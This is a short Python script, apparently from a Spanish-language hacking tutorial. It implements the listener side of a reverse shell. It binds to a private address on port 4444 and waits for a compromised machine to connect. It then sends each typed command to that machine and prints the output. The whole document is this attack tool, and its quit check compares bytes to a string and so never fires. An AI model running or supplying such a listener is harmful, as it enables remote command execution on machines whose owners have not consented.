import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

listener.bind(("192.168.0.207", 4444))
listener.listen(0)

print("[+]Esperando por conexiones")
connection, address = listener.accept()
print("[+]Tenemos una conexion de " + str(address))

while True:
	command = input("Shell>>")
	if str.encode(command) =='q':break
	if len(str.encode(command)) > 0:
		connection.send(str.encode(command))
		result = str(connection.recv(1024))
		print(result)
